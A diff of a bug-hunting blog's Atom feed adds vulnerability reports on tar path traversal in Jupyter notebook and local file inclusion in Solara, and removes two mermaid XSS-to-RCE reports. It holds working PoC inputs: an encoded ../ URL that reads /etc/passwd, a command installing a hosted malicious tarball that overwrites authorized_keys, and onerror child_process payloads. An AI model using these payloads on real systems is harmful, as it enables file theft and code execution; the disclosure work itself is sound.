@@ -1,4 +1,245 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://0.0.0.0:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://0.0.0.0:4000/" rel="alternate" type="text/html" /><updated>2024-07-04T11:35:50+08:00</updated><id>http://0.0.0.0:4000/feed.xml</id><title type="html">sunriseXu’s bug hunting journey</title><subtitle>sunriseXu&apos;s bug hunting journey, sharing new findings of bug hunting.</subtitle><entry><title type="html">Unsafe eval via f2py in Numpy</title><link href="http://0.0.0.0:4000/file-overwrite/2024/07/03/eval-in-numpy.html" rel="alternate" type="text/html" title="Unsafe eval via f2py in Numpy" /><published>2024-07-03T10:31:06+08:00</published><updated>2024-07-03T10:31:06+08:00</updated><id>http://0.0.0.0:4000/file-overwrite/2024/07/03/eval-in-numpy</id><content type="html" xml:base="http://0.0.0.0:4000/file-overwrite/2024/07/03/eval-in-numpy.html"><![CDATA[<h2 id="name">Name</h2>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://0.0.0.0:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://0.0.0.0:4000/" rel="alternate" type="text/html" /><updated>2024-07-09T17:30:41+08:00</updated><id>http://0.0.0.0:4000/feed.xml</id><title type="html">sunriseXu’s bug hunting journey</title><subtitle>sunriseXu&apos;s bug hunting journey, sharing new findings of bug hunting.</subtitle><entry><title type="html">Arbitrary File Overwrite in jupyter notebook</title><link href="http://0.0.0.0:4000/file-overwrite/2024/07/09/arbitrary-file-overwrite-in-jupyter-notebook.html" rel="alternate" type="text/html" title="Arbitrary File Overwrite in jupyter notebook" /><published>2024-07-09T10:31:06+08:00</published><updated>2024-07-09T10:31:06+08:00</updated><id>http://0.0.0.0:4000/file-overwrite/2024/07/09/arbitrary-file-overwrite-in-jupyter-notebook</id><content type="html" xml:base="http://0.0.0.0:4000/file-overwrite/2024/07/09/arbitrary-file-overwrite-in-jupyter-notebook.html"><![CDATA[<h2 id="name">Name</h2>
+
+<blockquote>
+  <p>Arbitrary File Overwrite in jupyter notebook</p>
+</blockquote>
+
+<h2 id="weakness">Weakness</h2>
+
+<blockquote>
+  <p>CWE-22: Path Traversal</p>
+</blockquote>
+
+<h2 id="severity">Severity</h2>
+
+<blockquote>
+  <p>High (8.8)</p>
+</blockquote>
+
+<h2 id="version">Version</h2>
+
+<blockquote>
+  <p>6.5.7</p>
+</blockquote>
+
+<h3 id="summary">Summary</h3>
+
+<p>Notebook can install a Javascript extension <a href="https://github.com/jupyter/notebook/blob/633c5be992a7139f67df8615e7c3ea0fc5e787c9/notebook/nbextensions.py#L69">from remote sources</a>, if the remote source package is compressed using tar format, it will use <a href="https://github.com/jupyter/notebook/blob/633c5be992a7139f67df8615e7c3ea0fc5e787c9/notebook/nbextensions.py#L154"><code class="language-plaintext highlighter-rouge">tarfile.extractall</code></a> to extract tarball.  However, it doesn’t filter the members in tarball, in this case, members with absolute and relative path names will be extract outside target directory, causing arbitrary file overwrite.</p>
+
+<h3 id="details">Details</h3>
+
+<p>From the <a href="https://github.com/jupyter/notebook/blob/633c5be992a7139f67df8615e7c3ea0fc5e787c9/notebook/nbextensions.py#L635">source code</a>, user can install nbextension by following command:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jupyter nbextension install path|url [--user|--sys-prefix]
+</code></pre></div></div>
+<p>When installing packages from an url, it calls <code class="language-plaintext highlighter-rouge">install_nbextension</code> to download the tarball from online source and extracts the tarball using <code class="language-plaintext highlighter-rouge">tarfile.extractall</code>.
+The vulnerable function <a href="https://github.com/jupyter/notebook/blob/633c5be992a7139f67df8615e7c3ea0fc5e787c9/notebook/nbextensions.py#L154"><code class="language-plaintext highlighter-rouge">install_nbextension#L154</code></a>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def install_nbextension(path, overwrite=False, symlink=False,
+                        user=False, prefix=None, nbextensions_dir=None,
+                        destination=None, verbose=DEPRECATED_ARGUMENT,
+                        logger=None, sys_prefix=False
+                        ):
+    ...
+    if path.startswith(('https://', 'http://')):
+        if symlink:
+            raise ValueError("Cannot symlink from URLs")
+        # Given a URL, download it
+        with TemporaryDirectory() as td:
+            filename = urlparse(path).path.split('/')[-1]
+            local_path = os.path.join(td, filename)
+            if logger:
+                logger.info(f"Downloading: {path} -&gt; {local_path}")
+            urlretrieve(path, local_path)
+            # now install from the local copy
+            full_dest = install_nbextension(local_path, overwrite=overwrite, symlink=symlink,
+                nbextensions_dir=nbext, destination=destination, logger=logger)
+    elif path.endswith('.zip') or _safe_is_tarfile(path):
+        if symlink:
+            raise ValueError("Cannot symlink from archives")
+        if destination:
+            raise ValueError("Cannot give destination for archives")
+        if logger:
+            logger.info(f"Extracting: {path} -&gt; {nbext}")
+
+        if path.endswith('.zip'):
+            archive = zipfile.ZipFile(path)
+        elif _safe_is_tarfile(path):
+            archive = tarfile.open(path)
+        # Vulnerable sink!!!!
+        archive.extractall(nbext)
+        archive.close()
+        ...
+
+    return full_dest
+</code></pre></div></div>
+
+<h3 id="poc">PoC</h3>
+
+<ol>
+  <li>
+    <p>Using following command to install a malicious extension:</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  jupyter nbextension install https://media.githubusercontent.com/media/sunriseXu/onnx/main/hack.tar.gz --user
+</code></pre></div>    </div>
+  </li>
+  <li>Check file path <code class="language-plaintext highlighter-rouge">/home/kali/.ssh/authorized_keys</code> has been overwritten
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ls -la /home/kali/.ssh
+  &gt; -rw-r--r--  1 kali kali 2098 Sep 11  2023 authorized_keys
+</code></pre></div>    </div>
+  </li>
+  <li>Check on <a href="https://colab.research.google.com/drive/1iX1yj4CaRn4fQBoiejQM059Xp9z8gOmm?usp=sharing">colab</a>.</li>
+</ol>
+
+<p><img width="751" alt="1720496729240" src="https://github.com/jupyter/notebook/assets/33363160/90fc632b-dd9c-43c2-9a41-61ded73ac4a8" /></p>
+
+<h3 id="impact">Impact</h3>
+
+<p>If a victim installs a malicious tarball extension, the tarball will be extracted outside the target directory and cause arbitrary file overwrite.</p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Local File Inclusion in Solara</title><link href="http://0.0.0.0:4000/file-overwrite/2024/07/09/local-file-inclusion-in-solara.html" rel="alternate" type="text/html" title="Local File Inclusion in Solara" /><published>2024-07-09T10:31:06+08:00</published><updated>2024-07-09T10:31:06+08:00</updated><id>http://0.0.0.0:4000/file-overwrite/2024/07/09/local-file-inclusion-in-solara</id><content type="html" xml:base="http://0.0.0.0:4000/file-overwrite/2024/07/09/local-file-inclusion-in-solara.html"><![CDATA[<h2 id="name">Name</h2>
+
+<blockquote>
+  <p>Local File Inclusion in Solara</p>
+</blockquote>
+
+<h2 id="weakness">Weakness</h2>
+
+<blockquote>
+  <p>CWE-22: Path Traversal</p>
+</blockquote>
+
+<h2 id="severity">Severity</h2>
+
+<blockquote>
+  <p>High (8.8)</p>
+</blockquote>
+
+<h2 id="version">Version</h2>
+
+<blockquote>
+  <p>1.34.1</p>
+</blockquote>
+
+<h3 id="summary">Summary</h3>
+
+<p>A local file inclusion is present in the Solara when requesting resource files under the <code class="language-plaintext highlighter-rouge">/{cdn_helper.cdn_url_path}/&lt;path:path&gt;</code> route.</p>
+
+<h3 id="details">Details</h3>
+
+<p>The endpoint <a href="https://github.com/widgetti/solara/blob/b69c5e06068038291025badce652824a7962bc8b/solara/server/flask.py#L215">cdn</a> is used to load resource file from cdn. However when resource file is cached, it will load files from local file system directly.</p>
+
+<p>The <a href="https://github.com/widgetti/solara/blob/b69c5e06068038291025badce652824a7962bc8b/solara/server/flask.py#L215"><code class="language-plaintext highlighter-rouge">cdn</code> endpoint</a>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@blueprint.route(f"/{cdn_helper.cdn_url_path}/&lt;path:path&gt;")
+def cdn(path):
+    if not allowed():
+        abort(401)
+    cache_directory = settings.assets.proxy_cache_dir
+    content = cdn_helper.get_data(Path(cache_directory), path)
+    mime = mimetypes.guess_type(path)
+    return flask.Response(content, mimetype=mime[0])
+</code></pre></div></div>
+
+<p>The <a href="https://github.com/widgetti/solara/blob/b69c5e06068038291025badce652824a7962bc8b/solara/server/cdn_helper.py#L38"><code class="language-plaintext highlighter-rouge">get_data</code></a> calls <a href="https://github.com/widgetti/solara/blob/b69c5e06068038291025badce652824a7962bc8b/solara/server/cdn_helper.py#L24"><code class="language-plaintext highlighter-rouge">get_from_cache</code></a> to lookup cached files, it  concatenates <code class="language-plaintext highlighter-rouge">path</code> into <code class="language-plaintext highlighter-rouge">base_cache_dir</code> to get cached path directly and load the content afterwards. The <code class="language-plaintext highlighter-rouge">path</code> comes from the <code class="language-plaintext highlighter-rouge">&lt;path:path&gt;</code> part of <code class="language-plaintext highlighter-rouge">cdn</code> route. In this case, when path is <code class="language-plaintext highlighter-rouge">..%2f..%2f..%2f..%2f..%2fetc%2fpasswd</code>, attacks can use path traversal to read any files in local file system.</p>
+
+<p>The function <a href="https://github.com/widgetti/solara/blob/b69c5e06068038291025badce652824a7962bc8b/solara/server/cdn_helper.py#L38"><code class="language-plaintext highlighter-rouge">get_data</code></a> and <a href="https://github.com/widgetti/solara/blob/b69c5e06068038291025badce652824a7962bc8b/solara/server/cdn_helper.py#L24"><code class="language-plaintext highlighter-rouge">get_from_cache</code></a></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def get_data(base_cache_dir: pathlib.Path, path):
+    parts = path.replace("\\", "/").split("/")
+    store_path = path if len(parts) != 1 else pathlib.Path(path) / "__main.js"
+
+    content = get_from_cache(base_cache_dir, store_path)
+    if content:
+        return content
+
+    url = get_cdn_url(path)
+    response = requests.get(url)
+    if response.ok:
+        put_in_cache(base_cache_dir, store_path, response.content)
+        return response.content
+    else:
+        logger.warning("Could not load URL: %r", url)
+        raise Exception(f"Could not load URL: {url}")
+
+def get_from_cache(base_cache_dir: pathlib.Path, path):
+    cache_path = base_cache_dir / path
+    try:
+        logger.info("Opening cache file: %s", cache_path)
+        return cache_path.read_bytes()
+    except FileNotFoundError:
+        pass
+</code></pre></div></div>
+
+<h3 id="poc">PoC</h3>
+
+<ol>
+  <li>
+    <p>Install Solara:</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> pip install solara
+</code></pre></div>    </div>
+  </li>
+  <li>Create <code class="language-plaintext highlighter-rouge">sol.py</code> following <a href="https://github.com/widgetti/solara/tree/master?tab=readme-ov-file#first-script">official docs</a>:
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  import solara
+
+ # Declare reactive variables at the top level. Components using these variables
+ # will be re-executed when their values change.
+ sentence = solara.reactive("Solara makes our team more productive.")
+ word_limit = solara.reactive(10)
+
+
+ @solara.component
+ def Page():
+     # Calculate word_count within the component to ensure re-execution when reactive variables change.
+     word_count = len(sentence.value.split())
+
+     solara.SliderInt("Word limit", value=word_limit, min=2, max=20)
+     solara.InputText(label="Your sentence", value=sentence, continuous_update=True)
+
+     # Display messages based on the current word count and word limit.
+     if word_count &gt;= int(word_limit.value):
+         solara.Error(f"With {word_count} words, you passed the word limit of {word_limit.value}.")
+     elif word_count &gt;= int(0.8 * word_limit.value):
+         solara.Warning(f"With {word_count} words, you are close to the word limit of {word_limit.value}.")
+     else:
+         solara.Success("Great short writing!")
+
+
+ # The following line is required only when running the code in a Jupyter notebook:
+ Page()
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Start the solara server.</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> solara run sol.py
+ &gt; Solara server is starting at http://localhost:8765
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Open the url: <code class="language-plaintext highlighter-rouge">http://127.0.0.1:8765/_solara/cdn/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd</code>, the output is the contents of the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file:</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> root:x:0:0:root:/root:/bin/bash
+ daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+ bin:x:2:2:bin:/bin:/usr/sbin/nologin
+ sys:x:3:3:sys:/dev:/usr/sbin/nologin
+ sync:x:4:65534:sync:/bin:/bin/sync
+ games:x:5:60:games:/usr/games:/usr/sbin/nologin
+ man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+ lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+ mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+ news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+ uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+ proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+ ...
+</code></pre></div>    </div>
+
+    <p><img src="/assets/cve/solara.png" alt="poc" /></p>
+  </li>
+</ol>
+
+<h3 id="impact">Impact</h3>
+
+<p>Any file on the backend filesystem can be read by an attacker with access to the solara server directly(If reverse proxy server such as nginx is used, the path parameter will be blocked).</p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Unsafe eval via f2py in Numpy(Invalid)</title><link href="http://0.0.0.0:4000/file-overwrite/2024/07/03/eval-in-numpy.html" rel="alternate" type="text/html" title="Unsafe eval via f2py in Numpy(Invalid)" /><published>2024-07-03T10:31:06+08:00</published><updated>2024-07-03T10:31:06+08:00</updated><id>http://0.0.0.0:4000/file-overwrite/2024/07/03/eval-in-numpy</id><content type="html" xml:base="http://0.0.0.0:4000/file-overwrite/2024/07/03/eval-in-numpy.html"><![CDATA[<h2 id="name">Name</h2>
 
 <blockquote>
   <p>Unsafe eval via f2py in Numpy</p>
@@ -111,7 +352,7 @@ uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(
 
 <h2 id="occurrences">Occurrences</h2>
 
-<p><a href="https://github.com/numpy/numpy/blob/c21ac104e544e24c88dbf625b6dccdbe7b90e39e/numpy/f2py/capi_maps.py#L157">load_f2cmap_file#L157</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Git remote origin leaks user access token</title><link href="http://0.0.0.0:4000/file-overwrite/2024/07/01/git-origin-leak-access-token.html" rel="alternate" type="text/html" title="Git remote origin leaks user access token" /><published>2024-07-01T10:31:06+08:00</published><updated>2024-07-01T10:31:06+08:00</updated><id>http://0.0.0.0:4000/file-overwrite/2024/07/01/git-origin-leak-access-token</id><content type="html" xml:base="http://0.0.0.0:4000/file-overwrite/2024/07/01/git-origin-leak-access-token.html"><![CDATA[<h2 id="name">Name</h2>
+<p><a href="https://github.com/numpy/numpy/blob/c21ac104e544e24c88dbf625b6dccdbe7b90e39e/numpy/f2py/capi_maps.py#L157">load_f2cmap_file#L157</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Git remote origin leaks user access token(Invalid)</title><link href="http://0.0.0.0:4000/file-overwrite/2024/07/01/git-origin-leak-access-token.html" rel="alternate" type="text/html" title="Git remote origin leaks user access token(Invalid)" /><published>2024-07-01T10:31:06+08:00</published><updated>2024-07-01T10:31:06+08:00</updated><id>http://0.0.0.0:4000/file-overwrite/2024/07/01/git-origin-leak-access-token</id><content type="html" xml:base="http://0.0.0.0:4000/file-overwrite/2024/07/01/git-origin-leak-access-token.html"><![CDATA[<h2 id="name">Name</h2>
 
 <blockquote>
   <p>Git remote origin leaks user access token</p>
@@ -290,7 +531,7 @@ prw-r--r-- 1 kali kali 0 Jun 24 19:48 /tmp/f
 
 <h2 id="occurrences">Occurrences</h2>
 
-<p><a href="https://github.com/nltk/nltk/blob/8c233dc585b91c7a0c58f96a9d99244a379740d5/nltk/data.py#L754">nltk.data.load#L754</a></p>]]></content><author><name></name></author><category term="command-injection" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Command injection via unsafe pickle.loads in torch.utils.model_dump in pytorch</title><link href="http://0.0.0.0:4000/command-injection/2024/06/24/command-injection-in-pytorch.html" rel="alternate" type="text/html" title="Command injection via unsafe pickle.loads in torch.utils.model_dump in pytorch" /><published>2024-06-24T10:31:06+08:00</published><updated>2024-06-24T10:31:06+08:00</updated><id>http://0.0.0.0:4000/command-injection/2024/06/24/command-injection-in-pytorch</id><content type="html" xml:base="http://0.0.0.0:4000/command-injection/2024/06/24/command-injection-in-pytorch.html"><![CDATA[<h2 id="name">Name</h2>
+<p><a href="https://github.com/nltk/nltk/blob/8c233dc585b91c7a0c58f96a9d99244a379740d5/nltk/data.py#L754">nltk.data.load#L754</a></p>]]></content><author><name></name></author><category term="command-injection" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Command injection via unsafe pickle.loads in torch.utils.model_dump in pytorch(Informative)</title><link href="http://0.0.0.0:4000/command-injection/2024/06/24/command-injection-in-pytorch.html" rel="alternate" type="text/html" title="Command injection via unsafe pickle.loads in torch.utils.model_dump in pytorch(Informative)" /><published>2024-06-24T10:31:06+08:00</published><updated>2024-06-24T10:31:06+08:00</updated><id>http://0.0.0.0:4000/command-injection/2024/06/24/command-injection-in-pytorch</id><content type="html" xml:base="http://0.0.0.0:4000/command-injection/2024/06/24/command-injection-in-pytorch.html"><![CDATA[<h2 id="name">Name</h2>
 
 <blockquote>
   <p>Command injection via unsafe pickle.loads in torch.utils.model_dump</p>
@@ -1019,91 +1260,4 @@ prw-r--r-- 1 kali kali 0 Jun 24 19:48 /tmp/f
 
 <p><a href="https://github.com/microsoft/hummingbird/blob/d489151e97eaa9d8ec446118b709863a5acab87d/hummingbird/ml/containers/sklearn/pytorch_containers.py#L172">PyTorchSklearnContainer.load#L172</a></p>
 
-<p><a href="https://github.com/microsoft/hummingbird/blob/d489151e97eaa9d8ec446118b709863a5acab87d/hummingbird/ml/containers/sklearn/pytorch_containers.py#L177">PyTorchSklearnContainer.load#L177</a></p>]]></content><author><name></name></author><category term="command-injection" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">XSS in Bluestone Electron App when rendering mermaid class diagram Leading to RCE(Just Thanks)</title><link href="http://0.0.0.0:4000/xss/2024/06/04/xss-in-bluestone-render-mermaid-diagram.html" rel="alternate" type="text/html" title="XSS in Bluestone Electron App when rendering mermaid class diagram Leading to RCE(Just Thanks)" /><published>2024-06-04T10:31:06+08:00</published><updated>2024-06-04T10:31:06+08:00</updated><id>http://0.0.0.0:4000/xss/2024/06/04/xss-in-bluestone-render-mermaid-diagram</id><content type="html" xml:base="http://0.0.0.0:4000/xss/2024/06/04/xss-in-bluestone-render-mermaid-diagram.html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>Due to outdated mermaid 10.0.2 is used to render diagrams, a XSS in class diagram is able to trigger, chained with insecure configuration of windows electron app, attacker is able to execute code in victims’ local system.</p>
-
-<h3 id="details">Details</h3>
-<p>Bluestone is using <a href="https://github.com/1943time/bluestone/blob/07535f86adebe8f7f00c299ca60792189eff2a64/package.json#L67">mermaid 10.0.2</a> to render mermaid diagram. <a href="https://github.com/Milkdown/milkdown/issues/1267#issuecomment-2018032986">This issue</a> have discussed the XSS in mermaid below 10.9.0 when rendering the node names of classDiagram. Specifically, The names of node are not fully sanitized which leads to  injection of XSS payload.</p>
-
-<p>Besides, the electron app sets <code class="language-plaintext highlighter-rouge">nodeIntegration</code> to <a href="https://github.com/1943time/bluestone/blob/07535f86adebe8f7f00c299ca60792189eff2a64/src/main/api.ts#L33"><code class="language-plaintext highlighter-rouge">true</code></a> which is harmful, according to <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/electron-desktop-apps#introduction">this attack</a>, a XSS can be escalated to execute command on victims’ local system.</p>
-
-<h3 id="poc">PoC</h3>
-
-<ol>
-  <li>
-    <p>Download latest Bluestone v0.22.0 windows electron app from <a href="https://github.com/1943time/bluestone/releases/download/v0.22.0/Bluestone-win-x64.exe">official repo</a>, and install the application:</p>
-  </li>
-  <li>
-    <p>Open the payload markdown file using the Bluestone app, the payload is following:</p>
-
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> classDiagram
- Class01 &lt;|-- `AveryLngClas&lt;img src='x' onerror=require('child_process').exec('calc');&gt;`
-</code></pre></div>    </div>
-  </li>
-  <li>
-    <p>The calculator poped up.</p>
-
-    <p><img src="/assets/images/mermaid/bluestone-rce.png" alt="rce" /></p>
-  </li>
-</ol>
-
-<h3 id="impact">Impact</h3>
-
-<p>Client side code execution.</p>
-
-<h3 id="reference">Reference</h3>
-
-<p><a href="https://github.com/Milkdown/milkdown/issues/1267#issuecomment-2018032986">https://github.com/Milkdown/milkdown/issues/1267#issuecomment-2018032986</a></p>
-
-<h3 id="occurence">Occurence</h3>
-
-<p><a href="https://github.com/1943time/bluestone/blob/07535f86adebe8f7f00c299ca60792189eff2a64/package.json#L67">https://github.com/1943time/bluestone/blob/07535f86adebe8f7f00c299ca60792189eff2a64/package.json#L67</a></p>
-
-<p><a href="https://github.com/1943time/bluestone/blob/07535f86adebe8f7f00c299ca60792189eff2a64/src/main/api.ts#L33">https://github.com/1943time/bluestone/blob/07535f86adebe8f7f00c299ca60792189eff2a64/src/main/api.ts#L33</a></p>
-
-<h3 id="mitigation">Mitigation</h3>
-
-<ol>
-  <li>Upgrade the mermaid to latest version which is <code class="language-plaintext highlighter-rouge">10.9.1</code>.</li>
-  <li>Disable <code class="language-plaintext highlighter-rouge">nodeIntegration</code> in electron app.</li>
-</ol>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Summary Due to outdated mermaid 10.0.2 is used to render diagrams, a XSS in class diagram is able to trigger, chained with insecure configuration of windows electron app, attacker is able to execute code in victims’ local system.]]></summary></entry><entry><title type="html">XSS in Siyuan Electron App when rendering mermaid block diagram Leading to RCE(Just Thanks)</title><link href="http://0.0.0.0:4000/xss/2024/06/04/xss-in-siyuan-render-mermaid-diagram.html" rel="alternate" type="text/html" title="XSS in Siyuan Electron App when rendering mermaid block diagram Leading to RCE(Just Thanks)" /><published>2024-06-04T10:31:06+08:00</published><updated>2024-06-04T10:31:06+08:00</updated><id>http://0.0.0.0:4000/xss/2024/06/04/xss-in-siyuan-render-mermaid-diagram</id><content type="html" xml:base="http://0.0.0.0:4000/xss/2024/06/04/xss-in-siyuan-render-mermaid-diagram.html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>Due to outdated mermaid 10.8.0 is used to render block diagrams, a XSS in block diagram is able to trigger, chained with insecure configuration of windows electron app, attacker is able to execute code in victims local system.</p>
-
-<h3 id="details">Details</h3>
-<p>Siyuan is using <a href="https://github.com/siyuan-note/siyuan/blob/cfec6bc600894e2b99a3f07310a2a4b65390e335/app/changelogs/v3.0.0/v3.0.0.md?plain=1#L30">mermaid 10.8.0</a> to render mermaid diagram. However, <a href="https://github.com/mermaid-js/mermaid/blob/d6ccd93cf207a30bbd45edf39fd29afdbb87b05e/cypress/platform/xss25.html#L98">the test html</a> in mermaid repo showed that the edge label names of <a href="https://github.com/mermaid-js/mermaid/pull/5221">new block diagram</a> is not sanitized and could lead to XSS. The name of node is not fully sanitized which leads to  injection of XSS payload.</p>
-
-<p>Besides, the electron app sets <code class="language-plaintext highlighter-rouge">nodeIntegration</code> to <a href="https://github.com/siyuan-note/siyuan/blob/cfec6bc600894e2b99a3f07310a2a4b65390e335/app/electron/main.js#L305"><code class="language-plaintext highlighter-rouge">true</code></a> which is harmful, according to <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/electron-desktop-apps#introduction">this attack</a>, a XSS can be escalated to execute command on victims’ local system.</p>
-
-<h3 id="poc">PoC</h3>
-
-<ol>
-  <li>
-    <p>Download latest Siyuan-3.0.17 windows electron app from <a href="https://release.liuyun.io/siyuan/siyuan-3.0.17-win.exe">official site</a>, and install the application:</p>
-  </li>
-  <li>Create new document, and type <code class="language-plaintext highlighter-rouge">/Mermaid</code> command to insert mermaid diagram using following payload:
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  block-beta
-  `A-- "X&lt;img src=x onerror=require('child_process').exec('calc');&gt;" --&gt;B
-</code></pre></div>    </div>
-  </li>
-  <li>
-    <p>The calculator poped up.</p>
-
-    <p><img src="/assets/images/mermaid/siyuan-rce.png" alt="rce" /></p>
-  </li>
-</ol>
-
-<h3 id="impact">Impact</h3>
-
-<p>Client side code execution.</p>
-
-<h3 id="reference">Reference</h3>
-
-<p><a href="https://github.com/siyuan-note/siyuan/issues/11645">https://github.com/siyuan-note/siyuan/issues/11645</a></p>
-
-<p><a href="https://github.com/mermaid-js/mermaid/blob/d6ccd93cf207a30bbd45edf39fd29afdbb87b05e/cypress/platform/xss25.html#L98">https://github.com/mermaid-js/mermaid/blob/d6ccd93cf207a30bbd45edf39fd29afdbb87b05e/cypress/platform/xss25.html#L98</a></p>
-
-<h3 id="occurence">Occurence</h3>
-
-<p><a href="https://github.com/siyuan-note/siyuan/blob/cfec6bc600894e2b99a3f07310a2a4b65390e335/app/electron/main.js#L305">https://github.com/siyuan-note/siyuan/blob/cfec6bc600894e2b99a3f07310a2a4b65390e335/app/electron/main.js#L305</a></p>
-
-<p><a href="https://github.com/siyuan-note/siyuan/blob/cfec6bc600894e2b99a3f07310a2a4b65390e335/app/changelogs/v3.0.0/v3.0.0.md?plain=1#L30">https://github.com/siyuan-note/siyuan/blob/cfec6bc600894e2b99a3f07310a2a4b65390e335/app/changelogs/v3.0.0/v3.0.0.md?plain=1#L30</a></p>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Summary Due to outdated mermaid 10.8.0 is used to render block diagrams, a XSS in block diagram is able to trigger, chained with insecure configuration of windows electron app, attacker is able to execute code in victims local system.]]></summary></entry></feed>
+<p><a href="https://github.com/microsoft/hummingbird/blob/d489151e97eaa9d8ec446118b709863a5acab87d/hummingbird/ml/containers/sklearn/pytorch_containers.py#L177">PyTorchSklearnContainer.load#L177</a></p>]]></content><author><name></name></author><category term="command-injection" /><summary type="html"><![CDATA[Name]]></summary></entry></feed>
